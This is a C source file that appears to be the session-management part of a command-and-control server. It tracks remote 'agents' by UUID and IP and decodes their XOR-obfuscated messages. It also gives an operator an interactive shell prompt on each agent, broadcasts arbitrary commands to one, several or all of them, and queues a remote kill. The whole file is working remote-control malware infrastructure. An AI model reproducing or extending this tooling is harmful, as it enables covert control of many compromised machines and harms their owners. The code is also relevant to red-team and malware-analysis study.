#include "../include/Session.h"
#include "../include/Cipher.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define ColReset "\033[0m"
#define ColWhite "\033[1;37m"
#define ColGray  "\033[0;90m"
#define ColGreen "\033[0;32m"
#define ColCyan  "\033[0;36m"
#define ColRed   "\033[1;31m"

static void ReprintPrompt(SessionPool *P)
{
    if (P->Interactive && P->ActiveId > 0) {
        AgentSession *S = PoolById(P, P->ActiveId);
        if (S) printf("\r\033[Ksession-%d ~$ ", S->Id);
        else   printf("\r\033[Kserver ~$ ");
    } else {
        printf("\r\033[Kserver ~$ ");
    }
    fflush(stdout);
}

int FrameParse(const char *Raw, int RawLen,
               char *UuidOut, char *PayloadOut, int *PayloadLen)
{
    if (RawLen < 38) return 0;
    if (Raw[36] != '|') return 0;
    memcpy(UuidOut, Raw, 36);
    UuidOut[36] = '\0';
    int PLen = RawLen - 37;
    if (PLen <= 0 || PLen >= BufSize) return 0;
    memcpy(PayloadOut, Raw + 37, (size_t)PLen);
    PayloadOut[PLen] = '\0';
    ApplyXor(PayloadOut, (size_t)PLen);
    *PayloadLen = PLen;
    return 1;
}

void PoolInit(SessionPool *P, LogStore *L)
{
    memset(P, 0, sizeof(*P));
    P->NextId      = 1;
    P->Interactive = 0;
    P->ActiveId    = 0;
    P->Log         = L;
}

AgentSession *PoolRegister(SessionPool *P, const char *Uuid, const char *Ip)
{
    for (int I = 0; I < P->Count; I++) {
        AgentSession *S = &P->Slots[I];
        if (S->State == StateActive && strcmp(S->Uuid, Uuid) == 0) {
            S->LastSeen = time(NULL);
            return S;
        }
    }
    if (P->Count >= MaxSessions) return NULL;
    AgentSession *S = &P->Slots[P->Count];
    memset(S, 0, sizeof(*S));
    S->Id        = P->NextId++;
    S->State     = StateActive;
    S->FirstSeen = time(NULL);
    S->LastSeen  = time(NULL);
    strncpy(S->Uuid,    Uuid, UuidLen  - 1);
    strncpy(S->Address, Ip,   AddrSize - 1);
    P->Count++;
    return S;
}

AgentSession *PoolById(SessionPool *P, int Id)
{
    for (int I = 0; I < P->Count; I++)
        if (P->Slots[I].Id == Id && P->Slots[I].State == StateActive)
            return &P->Slots[I];
    return NULL;
}

AgentSession *PoolActive(SessionPool *P)
{
    if (!P->Interactive || P->ActiveId == 0) return NULL;
    return PoolById(P, P->ActiveId);
}

void PoolList(SessionPool *P)
{
    int Found = 0;
    printf("\n");
    printf("  %s%-4s  %-18s  %-38s  %-10s  %s%s\n",
           ColWhite, "ID", "Address", "UUID", "State", "Last Seen", ColReset);
    printf("  %s%-4s  %-18s  %-38s  %-10s  %s%s\n",
           ColGray,
           "----", "------------------", "--------------------------------------",
           "----------", "---------", ColReset);
    for (int I = 0; I < P->Count; I++) {
        AgentSession *S = &P->Slots[I];
        if (S->State != StateActive) continue;
        char Ts[32];
        struct tm *Tm = localtime(&S->LastSeen);
        strftime(Ts, sizeof(Ts), "%H:%M:%S", Tm);
        printf("  %s%-4d%s  %s%-18s%s  %s%-38s%s  %s%-10s%s  %s\n",
               ColCyan,  S->Id,        ColReset,
               ColWhite, S->Address,   ColReset,
               ColGray,  S->Uuid,      ColReset,
               ColGreen, "active",     ColReset,
               Ts);
        Found = 1;
    }
    if (!Found) printf("  %sNo active sessions.%s\n", ColGray, ColReset);
    printf("\n");
}

void PoolKill(SessionPool *P, int Id)
{
    AgentSession *S = PoolById(P, Id);
    if (!S) {
        Msg(P->Log, LogError, "Session %d not found", Id);
        ReprintPrompt(P); return;
    }
    PoolQueueCommand(S, "kill");
    S->State = StateDead;
    if (P->ActiveId == Id) { P->Interactive = 0; P->ActiveId = 0; }
    Msg(P->Log, LogWarn, "Kill queued for session-%d (%s)", Id, S->Address);
    ReprintPrompt(P);
}

void PoolEnter(SessionPool *P, int Id)
{
    AgentSession *S = PoolById(P, Id);
    if (!S) {
        Msg(P->Log, LogError, "Session %d not found", Id);
        ReprintPrompt(P); return;
    }
    P->Interactive = 1;
    P->ActiveId    = Id;
    Msg(P->Log, LogInfo, "Entering session-%d (%s)", Id, S->Address);
    printf("session-%d ~$ ", Id);
    fflush(stdout);
}

void PoolLeave(SessionPool *P)
{
    P->Interactive = 0;
    P->ActiveId    = 0;
    printf("server ~$ ");
    fflush(stdout);
}

void PoolQueueCommand(AgentSession *S, const char *Cmd)
{
    strncpy(S->Pending, Cmd, BufSize - 1);
    S->Pending[BufSize - 1] = '\0';
    S->HasPending = 1;
}

void PoolExec(SessionPool *P, int Id, const char *Cmd)
{
    AgentSession *S = PoolById(P, Id);
    if (!S) {
        Msg(P->Log, LogError, "Session %d not found", Id);
        ReprintPrompt(P); return;
    }
    PoolQueueCommand(S, Cmd);
    char LogBuf[LogMsgLen];
    snprintf(LogBuf, sizeof(LogBuf), "[session-%d] %s", Id, Cmd);
    LogAdd(P->Log, LogCmd, Id, LogBuf);
    Msg(P->Log, LogInfo, "Queued for session-%d (%s): %s", Id, S->Address, Cmd);
    ReprintPrompt(P);
}

/*
 * Targets format: "all" | "1" | "1,2,3"
 */
void PoolExecAll(SessionPool *P, const char *Targets, const char *Cmd)
{
    int Queued = 0;
    int All    = !strcmp(Targets, "all");

    for (int I = 0; I < P->Count; I++) {
        AgentSession *S = &P->Slots[I];
        if (S->State != StateActive) continue;

        int Match = All;
        if (!Match) {
            char Buf[256];
            strncpy(Buf, Targets, sizeof(Buf) - 1);
            char *Token = strtok(Buf, ",");
            while (Token) {
                while (*Token == ' ') Token++;
                if (atoi(Token) == S->Id) { Match = 1; break; }
                Token = strtok(NULL, ",");
            }
        }
        if (!Match) continue;

        PoolQueueCommand(S, Cmd);
        char LogBuf[LogMsgLen];
        snprintf(LogBuf, sizeof(LogBuf), "[session-%d] %s", S->Id, Cmd);
        LogAdd(P->Log, LogCmd, S->Id, LogBuf);
        Msg(P->Log, LogInfo, "Queued for session-%d (%s)", S->Id, S->Address);
        Queued++;
    }

    if (!Queued)
        Msg(P->Log, LogWarn, "No matching sessions for targets: %s", Targets);
    else
        Msg(P->Log, LogInfo, "Command dispatched to %d agent(s): %s", Queued, Cmd);

    ReprintPrompt(P);
}

void PoolNotifyConnect(SessionPool *P, AgentSession *S)
{
    Msg(P->Log, LogInfo, "session-%d connected: %s", S->Id, S->Address);
    LogAdd(P->Log, LogInfo, S->Id, S->Uuid);
    ReprintPrompt(P);
}

void PoolNotifyOutput(SessionPool *P, AgentSession *S)
{
    char LogBuf[LogMsgLen];
    char OutSnip[900];
    strncpy(OutSnip, S->LastOutput, sizeof(OutSnip) - 1);
    OutSnip[sizeof(OutSnip) - 1] = '\0';
    snprintf(LogBuf, sizeof(LogBuf), "[session-%d output] %s", S->Id, OutSnip);
    LogAdd(P->Log, LogOutput, S->Id, LogBuf);

    char Ts[20];
    time_t Now = time(NULL);
    struct tm *Tm = localtime(&Now);
    strftime(Ts, sizeof(Ts), "%H:%M:%S", Tm);

    printf("\r\033[K%s%s%s [%ssession-%d%s | %s] output\n%s\n",
           ColGray, Ts, ColReset,
           ColCyan, S->Id, ColReset,
           S->Address,
           S->LastOutput);
    ReprintPrompt(P);
}
